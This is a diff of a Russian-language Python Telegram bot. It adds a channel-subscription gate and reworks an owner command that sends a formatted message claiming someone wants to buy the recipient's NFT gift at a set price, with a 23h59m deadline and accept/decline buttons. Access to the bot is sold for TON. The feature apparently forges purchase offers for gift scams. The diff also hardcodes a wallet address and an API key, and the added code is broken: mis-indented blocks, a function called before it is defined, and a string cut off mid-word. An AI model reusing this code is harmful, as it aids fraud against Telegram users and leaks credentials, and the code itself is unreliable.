@@ -19,6 +19,8 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
+CHANNEL_USERNAME = "@sosaworking"   # твой канал
+
 TON_WALLET = "UQBsdCC3QfN8OUim2ym5mKu9lx21F_X7DKA_xnVUWDymW0VR"                 # твой TON-адрес
 PRICE_NANOTON = 5_000_000_000        # 1 TON (поменяй сумму если нужно)
 TONAPI_KEY = "AG3OQIBPC7OZYLAAAAAFHTLPFKSTBTOKP6LLJ2E7NETOTH6JL7GQWQIDEVIAQ7MD6HYCXQY"                   # ключ с tonapi.io
@@ -175,21 +177,69 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     register_user(user)
 
-    keyboard = InlineKeyboardMarkup([
-    [InlineKeyboardButton("Подписка", callback_data="subscribe")],
-    [InlineKeyboardButton("Инструкция", callback_data="instruction")]
-])
+    # Проверяем подписку на канал
+    is_subscribed = await check_subscription(context, user.id)
 
-    photo_path = "welcome.png"  # замени на своё имя файла
+    if not is_subscribed:
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📢 Подписаться на канал", url=f"https://t.me/sosaworking")],
+            [InlineKeyboardButton("✅ Проверить подписку", callback_data="check_sub")]
+        ])
 
-    await update.effective_message.reply_photo(
-        photo=open(photo_path, "rb"),
-        caption="Добро пожаловать! Ты успешно зарегистрирован.",
-        reply_markup=keyboard,
-        # Делает превью меньше
-        # (Telegram сам сожмёт, если указать has_spoiler или просто отправить как документ, но лучше так)
-    )
+        await update.effective_message.reply_text(
+            "👋 Для использования бота необходимо быть подписанным на канал!",
+            reply_markup=keyboard
+        )
+        return
+    else:
+        # Если подписан — показываем обычное меню
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Подписка", callback_data="subscribe")],
+            [InlineKeyboardButton("Инструкция", callback_data="instruction")]
+        ])
 
+        photo_path = "welcome.png"
+
+        await update.effective_message.reply_photo(
+            photo=open(photo_path, "rb"),
+            caption="Добро пожаловать! Ты успешно зарегистрирован.",
+            reply_markup=keyboard,
+        )
+
+async def check_subscription(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
+    """Проверяет, подписан ли пользователь на канал"""
+    try:
+        member = await context.bot.get_chat_member(
+            chat_id=CHANNEL_USERNAME,
+            user_id=user_id
+        )
+        # Статусы подписки
+        return member.status in ["member", "administrator", "creator"]
+    except Exception:
+        return False  # если ошибка (например, бот не в канале или пользователь не найден)
+
+async def check_sub_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    user_id = query.from_user.id
+    is_subscribed = await check_subscription(context, user_id)
+
+    if is_subscribed:
+        await query.edit_message_text(
+            "✅ Отлично! Ты подписан на канал.\n\nТеперь можешь пользоваться ботом.",
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Продолжить", callback_data="back_to_start")
+            ]])
+        )
+    else:
+        await query.edit_message_text(
+            "❌ Ты всё ещё не подписан на канал\n\nПодпишись и нажми кнопку ниже.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📢 Подписаться", url="https://t.me/sosaworking")],
+                [InlineKeyboardButton("✅ Проверить ещё раз", callback_data="check_sub")]
+            ])
+        )
 
 async def instruction_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -316,9 +366,23 @@ async def business_offer_text(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     command_text = (message.text or "").strip()
-    parts = command_text.split(maxsplit=2)
+    parts = command_text.split()
     if not parts or parts[0].lower() != "жз":
-        return
+    return
+
+    if len(parts) != 4:
+    await notify_owner("Формат: жз ссылка сумма зв/грам\nПример: жз https://t.me/nft/... 790 зв")
+    return
+
+    gift_url = parts[1]
+    price_text = parts[2]
+    currency = parts[3].lower()
+
+    if currency not in ("зв", "грам", "звёзды", "звезды"):
+    await notify_owner("Валюта должна быть 'зв' или 'грам'")
+    return
+
+    is_grams = currency in ("грам",)
 
     async def notify_owner(text):
         try:
@@ -364,12 +428,18 @@ async def business_offer_text(update: Update, context: ContextTypes.DEFAULT_TYPE
     safe_url = escape(gift_url, quote=True)
     gift_name = escape(gift_url.rstrip("/").split("/")[-1])
 
+    if is_grams:
+    emoji = '<tg-emoji emoji-id="5474161364664629753">💎</tg-emoji>'
+    currency_name = "Gram"
+    else:
+    emoji = '<tg-emoji emoji-id="5321485469249198987">⭐</tg-emoji>'
+    currency_name = "⭐"
+
     text = (
-        f"<b>{sender_name}</b> хочет приобрести Ваш подарок "
-        f'<a href="{safe_url}">{gift_name}</a> ' f'за <b>{price}</b>'
-        '<tg-emoji emoji-id="5321485469249198987">⭐</tg-emoji>\n\n'
-        'Сделка активна в течение 23ч 59м.'
-    )
+    f"<b>{sender_name}</b> хочет приобрести Ваш подарок "
+    f'<a href="{safe_url}">{gift_name}</a> '
+    f'за <b>{price}</b> {emoji}\n\n'
+    'Сделка акт
 
     keyboard = InlineKeyboardMarkup([[
         InlineKeyboardButton("Отклонить", callback_data=f"decline:{offer_id}"),
@@ -673,7 +743,10 @@ def main():
     app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_to_start$"))
     app.add_handler(CallbackQueryHandler(buy_subscription, pattern="^buy_subscription$"))
     app.add_handler(CallbackQueryHandler(instruction_button, pattern="^instruction$"))
-    
+    app.add_handler(CallbackQueryHandler(check_sub_button, pattern="^check_sub$"))
+
+
+
     # Потом общий обработчик офферов
     app.add_handler(CallbackQueryHandler(button_handler))
 
